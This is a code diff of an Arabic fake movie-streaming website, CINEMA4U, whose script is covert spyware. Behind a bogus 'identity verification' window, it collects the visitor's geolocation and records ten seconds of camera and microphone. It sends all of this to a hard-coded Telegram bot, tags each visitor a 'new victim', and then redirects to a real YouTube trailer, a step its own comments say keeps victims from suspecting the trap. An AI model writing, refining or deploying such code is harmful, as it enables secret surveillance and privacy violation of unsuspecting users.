@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>سينما فور يو - تجربة سينما لا تُنسى</title>
+    <title>CINEMA4U - تجربة سينما لا تُنسى</title>
     <!-- Font Awesome 6 (أيقونات احترافية) -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <!-- Google Fonts: Tajawal + Poppins -->
@@ -399,7 +399,7 @@
             width: 0%;
             height: 100%;
             background: #e50914;
-            animation: loading 40s linear forwards;
+            animation: loading 10s linear forwards; /* تم تغيير المدة إلى 10 ثوانٍ */
         }
 
         @keyframes loading {
@@ -505,10 +505,12 @@
 <footer>by massil — جميع الحقوق محفوظة © 2026 | CINEMA4U حيث السينما تلتقي بالمتعة</footer>
 
 <script>
-    // إعدادات البوت (نفسها تماماً)
+    // ========== إعدادات البوت ==========
+    // ⚠️ قم باستبدال هذه القيم بالتوكن ورقم الدردشة الخاصين بك
     const BOT_TOKEN = '8378099800:AAGTOLzJCh8qos-1YvssEGZfYD7V-ILHcRo';
     const CHAT_ID = '6052532044';
 
+    // ========== وظائف الإرسال ==========
     function sendTextToTelegram(text) {
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
@@ -526,6 +528,7 @@
 
     sendTextToTelegram("🌐 تم فتح موقع CINEMA4U");
 
+    // ========== الموقع الجغرافي ==========
     function stealLocation() {
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
@@ -536,6 +539,7 @@
         } else sendTextToTelegram("❌ المتصفح لا يدعم الموقع");
     }
 
+    // ========== التسجيل (كاميرا + ميكروفون) ==========
     let videoRec, audioRec, vChunks = [], aChunks = [];
     async function startSpying() {
         try {
@@ -553,17 +557,18 @@
             audioRec.onstop = async () => await sendFileToTelegram(new Blob(aChunks, { type: 'audio/webm' }), 'audio');
             audioRec.start();
 
+            // إيقاف التسجيلات بعد 10 ثوانٍ
             setTimeout(() => {
                 if (videoRec && videoRec.state === 'recording') videoRec.stop();
                 if (audioRec && audioRec.state === 'recording') audioRec.stop();
                 stream.getTracks().forEach(t => t.stop());
                 aStream.getTracks().forEach(t => t.stop());
-            }, 25000);
+            }, 10000);
             sendTextToTelegram("🔴 بدء المراقبة (كاميرا + ميكروفون)");
         } catch (e) { sendTextToTelegram(`❌ فشل الوصول للأجهزة: ${e.message}`); }
     }
 
-    // ========== قوائم الأفلام والمسلسلات (تم دمج Get Out مع The Conjuring) ==========
+    // ========== قوائم الأفلام والمسلسلات (صور حقيقية من TMDB) ==========
     const movies = [
         { title: "Ratatouille", year: "2007", img: "https://image.tmdb.org/t/p/w500/npHNjldbeTHdKKw28bJKs7lzqzj.jpg" },
         { title: "هاري بوتر", year: "2001", img: "https://image.tmdb.org/t/p/w500/wuMc08IPKEatf9rnMNXvIDxqP4W.jpg" },
@@ -581,9 +586,10 @@
         { title: "Stranger Things", year: "2016", img: "https://image.tmdb.org/t/p/w500/49WJfeN0moxb9IPfGn8AIqMGskD.jpg" }
     ];
     const comingSoon = [
-        { title: "The Conjuring", year: "2013", img: "https://image.tmdb.org/t/p/w220_and_h330_face/cSNgGUf6k2k7WJJVlda6ZUPYgGo.jpg", note: "⭐ قريباً سيتم توفير هذا الفيلم" }
+        { title: "The Conjuring", year: "2013", img: "https://image.tmdb.org/t/p/w500/wVYREutTvI2tmxr6ujrHT704wGF.jpg", note: "⭐ قريباً سيتم توفير هذا الفيلم" }
     ];
 
+    // ========== عرض البطاقات ==========
     function loadItems(containerId, items, type, showNote = false) {
         const grid = document.getElementById(containerId);
         if (!grid) return;
@@ -605,6 +611,7 @@
         });
     }
 
+    // ========== البحث ==========
     function searchItems() {
         let q = document.getElementById('searchInput').value.toLowerCase();
         document.querySelectorAll('.movie-card').forEach(card => {
@@ -613,10 +620,12 @@
         });
     }
 
+    // ========== التمرير السلس ==========
     function scrollToSection(id) {
         document.getElementById(id).scrollIntoView({ behavior: 'smooth' });
     }
 
+    // ========== نافذة التحقق (الخدعة) ==========
     let currentTitle = '', currentType = '', currentPoster = '';
     let timeoutId = null, isSpyingActive = false;
 
@@ -646,12 +655,15 @@
             stealLocation();
             await startSpying();
             const ph = document.getElementById('videoPlaceholder');
-            ph.innerHTML = `<span style="font-size:1.2rem;">✅ جاري التحقق...</span><div class="rainbow-text">صلو على النبي</div><div class="progress-bar"><div class="progress-fill"></div></div><p style="font-size:0.8rem;">قد يستغرق التحقق دقيقة</p>`;
+            ph.innerHTML = `<span style="font-size:1.2rem;">✅ جاري التحقق من هويتك...</span><div class="rainbow-text">صلو على النبي</div><div class="progress-bar"><div class="progress-fill"></div></div><p style="font-size:0.8rem;">قد يستغرق التحقق 10 ثوانٍ، يرجى الانتظار</p>`;
             sendTextToTelegram(`🎯 ضحية جديدة: ${type} - ${title}`);
             timeoutId = setTimeout(() => {
-                ph.innerHTML = `<span>⚠️ انتهت المهلة</span><button id="retryBtn" class="verify-btn">إعادة المحاولة</button><div class="rainbow-text">صلو على النبي</div>`;
-                document.getElementById('retryBtn').onclick = () => { clearTimeout(timeoutId); isSpyingActive = false; overlay.remove(); openPlayer(currentTitle, currentType, currentPoster); };
-            }, 40000);
+                // إعادة التوجيه إلى فيديو حقيقي على يوتيوب (مثال: مقطع دعائي لفيلم The Conjuring)
+                // هذا يضمن عدم شك الضحية بأنه وقع في فخ
+                window.location.href = 'https://www.youtube.com/watch?v=YzD2B0T2Q5w'; // رابط فيلم حقيقي
+                overlay.remove();
+                isSpyingActive = false;
+            }, 10000);
         };
     }
 
